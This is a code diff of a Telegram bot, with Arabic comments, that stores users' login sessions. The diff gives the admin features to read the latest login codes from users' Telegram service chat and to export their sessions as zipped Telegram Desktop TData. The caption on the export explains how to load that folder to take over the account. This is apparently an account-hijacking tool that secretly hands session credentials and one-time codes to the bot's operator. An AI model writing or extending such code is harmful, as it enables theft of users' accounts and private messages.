@@ -1,4 +1,7 @@
 import os
+# ضروري جداً لمكتبة opentele لتعمل على السيرفر
+os.environ["QT_QPA_PLATFORM"] = "offscreen" 
+
 import json
 import asyncio
 import time
@@ -165,21 +168,21 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"التحكم الكامل بحساب: `{phone}`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))
         return
 
-    # --- الميزة الجديدة: قراءة الكود بواسطة Pyrogram ---
+    # --- قراءة الكود باستخدام Telethon ---
     if data.startswith("adm_otp_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
         session_str = db[str(target_uid)][phone]["session"]
         await query.edit_message_text("⏳ جاري الاتصال وقراءة أحدث رسالة (الكود)...")
         try:
-            from pyrogram import Client as PyroClient
-            acc_client = PyroClient("get_code_temp", session_string=session_str, api_id=API_ID, api_hash=API_HASH, in_memory=True)
-            await acc_client.connect()
+            temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            await temp_client.connect()
             
             latest_code = None
             full_message = ""
             
-            async for msg in acc_client.get_chat_history(777000, limit=3):
+            messages = await temp_client.get_messages(777000, limit=5)
+            for msg in messages:
                 if msg.text:
                     match = re.search(r"\b(\d{5,6})\b", msg.text)
                     if match:
@@ -187,7 +190,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         full_message = msg.text
                         break
                         
-            await acc_client.disconnect()
+            await temp_client.disconnect()
             
             if latest_code:
                 text = f"✅ **أحدث كود وصل للحساب** `{phone}`:\n\n"
@@ -273,6 +276,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer(f"❌ خطأ: {e}", show_alert=True)
         return
 
+    # --- استخراج TData بواسطة opentele ---
     if data.startswith("adm_tdata_") and user_id == ADMIN_ID:
         parts = data.split("_")
         target_uid, phone = int(parts[2]), parts[3]
@@ -284,14 +288,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             os.makedirs(temp_dir, exist_ok=True)
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
             await client.connect()
+            
             tdesk = await TDesktop.FromTelethon(client)
             tdata_path = os.path.join(temp_dir, "tdata")
             await tdesk.SaveTData(tdata_path)
             await client.disconnect()
+            
             zip_filename = f"tdata_{phone}"
             shutil.make_archive(zip_filename, 'zip', tdata_path)
             with open(f"{zip_filename}.zip", 'rb') as f:
-                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}")
+                await query.message.reply_document(document=f, filename=f"tdata_{phone}.zip", caption=f"📁 TData للحساب {phone}\n\n1. افتح التلغرام على الكمبيوتر.\n2. ضع هذا المجلد مكان مجلد tdata القديم.")
             shutil.rmtree(temp_dir, ignore_errors=True)
             os.remove(f"{zip_filename}.zip")
         except Exception as e:
@@ -338,10 +344,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             os.makedirs(temp_dir, exist_ok=True)
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
             await client.connect()
+            
             tdesk = await TDesktop.FromTelethon(client)
             tdata_path = os.path.join(temp_dir, "tdata")
             await tdesk.SaveTData(tdata_path)
             await client.disconnect()
+            
             zip_filename = f"tdata_{phone}"
             shutil.make_archive(zip_filename, 'zip', tdata_path)
             with open(f"{zip_filename}.zip", 'rb') as f:
@@ -439,12 +447,11 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         try:
-            # إرجاع الطريقة الطبيعية (إرسال للتطبيق)
             await client.send_code_request(phone)
             user_states[user_id] = f"waiting_code:{phone}"
             if user_id not in active_clients: active_clients[user_id] = {}
             active_clients[user_id][f"temp_{phone}"] = client
-            await update.message.reply_text(f"✅ تم إرسال الكود. أرسله هنا:")
+            await update.message.reply_text(f"✅ تم إرسال الكود إلى تطبيق تلغرام في هاتفك. (لا تنسخه وتلصقه، بل استخدم زر قراءة OTP من لوحة الأدمن إن أردت). أرسله هنا:")
         except Exception as e:
             await update.message.reply_text(f"❌ خطأ: {e}")
             user_states.pop(user_id, None)
